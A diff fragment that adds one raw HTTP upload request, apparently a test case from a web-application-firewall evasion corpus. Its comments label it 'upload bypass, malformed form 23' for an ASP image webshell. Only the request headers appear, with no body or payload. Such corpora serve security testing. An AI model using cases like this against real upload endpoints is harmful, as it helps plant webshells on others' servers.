@@ -1,0 +1,10 @@
+# upload_bypass_畸形表单23
+# ASP图片马
+POST /?bid=hd_tag_m8mv26fy HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26fy
+RM-PRO-Token: b2ce5d6e49dceaa95b6a078133e554c9
+RM-PRO-Time: 1742808623942
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=UBCYVZibYt01PLLwc9kKOSg4-AH41-o6
+
